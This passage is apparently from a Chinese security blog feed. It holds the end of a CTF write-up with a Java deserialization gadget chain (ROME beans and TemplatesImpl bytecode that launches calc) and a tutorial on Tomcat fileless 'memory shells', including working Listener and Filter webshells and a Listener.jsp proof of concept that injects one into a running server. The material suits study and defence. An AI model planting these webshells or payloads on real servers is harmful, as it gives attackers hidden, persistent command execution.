class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//构造TemplatesImpl对象</span><br>        <span class="hljs-type">byte</span>[] bytecode= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIAoABgATCgAUABUIABYKABQAFwcACQcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlDb2RlLmphdmEMAAcACAcAGwwAHAAdAQAEY2FsYwwAHgAfAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] bytee= <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecode&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,bytee);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Code&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//构造ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templates);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//构造ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//构造HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改字段</span><br>        Field obj=EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-keyword">return</span>  hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb内存马学习</title>
      <link href="/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWeb内存马"><a href="#JavaWeb内存马" class="headerlink" title="JavaWeb内存马"></a>JavaWeb内存马</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的<strong>动态注册</strong>。</p><h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png" alt="image-20230131214733513"></p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，能对Servlet中的各种资源进行访问、添加、删除等。其在Java中的具体实现是<code>javax.servlet.ServletContext</code>接口</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法。</p><p>Tomcat这里使用了<code>门面模式</code>，对<code>ApplicationContext</code>类进行了封装，我们调用<code>getServletContext()</code>方法获得的其实是<code>ApplicationContextFacade</code>类(门面类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ApplicationContextFacade</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.context = context;<span class="hljs-comment">//context的传递</span><br> <br>        classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>        initClassCache();<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>ApplicationContextFacade</code>类方法中都会调用this.context相应的方法，因此最终调用的还是<code>ApplicationContext</code>类的方法。</p><blockquote><p>门面模式可以简单分为三个部分:子系统、门面(Facade)、客户端</p><p>客户端可以通过调用门面方法进而调用集成的子系统方法，以医院类比，客户端相当于病人，门面相当于接待员，而子系统是医院内部细化的各部门。</p></blockquote><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。</p><p><code>ApplicationContext</code>中的许多方法实际上还是调用了<code>StandardContext</code>中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext context;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestCharacterEncoding</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">return</span> context.getRequestCharacterEncoding();<br>      &#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312219609.png" alt="image-20230131221926469"></p><blockquote><p>可以看出我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote><h2 id="0x01-Tomcat内存马"><a href="#0x01-Tomcat内存马" class="headerlink" title="0x01 Tomcat内存马"></a>0x01 Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型,Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>这依赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，为方便调试，先加入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.0.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意版本与本机tomcat匹配，tomcat10后把很多常用类的位置都改了</p></blockquote><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>目标就是在服务器中动态注册一个恶意的Listener。</p><p>而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><blockquote><p><code>ServletRequestListener</code>用于监听<code>ServletRequest</code>对象，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法</p></blockquote><p>创建一个Servlet项目实现恶意Listener,目录配置⬇️</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010141228.png" alt="image-20230201014157169"></p><p>shell_Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问任意目录可以执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010146200.png" alt="image-20230201014602139"></p><blockquote><p>接下来只要将恶意Listener动态注册进服务器</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">requestInitialized:<span class="hljs-number">13</span>, shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>StandardContext#fireRequestInitEvent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br>        Object instances[] = getApplicationEventListeners();<span class="hljs-comment">//获取Listener数组</span><br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<span class="hljs-comment">//遍历触发数组内各Listener的requestInitialized方法</span><br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进第一行的<code>getApplicationEventListeners()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<span class="hljs-comment">//存储里Listener</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>    <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010157913.png" alt="image-20230201015745831"></p><p><code>StandardContext</code>也定义类添加Listener的方法,那么我们为了注册恶意Listener，就必须先获取<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-comment">// Select the Context to be used for this Request</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> request.getContext();<br></code></pre></td></tr></table></figure><p>JSP内置了request对象,因此我们可以通过反射获取</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>也可以利用类加载器</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>再添加一下上面写的恶意Listener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">shell_Listener</span> <span class="hljs-variable">shell_listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">shell_Listener</span>();<br>  context.addApplicationEventListener(shell_listener);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><p>Listener.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><p>测试前，先将之前的Listener删除，先直接尝试命令执行，发现弹计算器失败，再访问一下Listener.jsp</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010211631.png" alt="image-20230201021155544"></p><p>此时Shell_Listener已经被加载进服务器，再次尝试弹计算器</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010212384.png" alt="image-20230201021249301"></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener的思路，实现一个恶意Filter。Filter的调用是通过FilterChain实现的，具体流程如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010214825.png" alt="image-20230201021445758"></p><blockquote><p>只要重写doFilter方法即可</p></blockquote><p>恶意Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span> <span class="hljs-comment">//应用到所有路由</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | NullPointerException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010219311.png" alt="image-20230201021930234"></p><h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 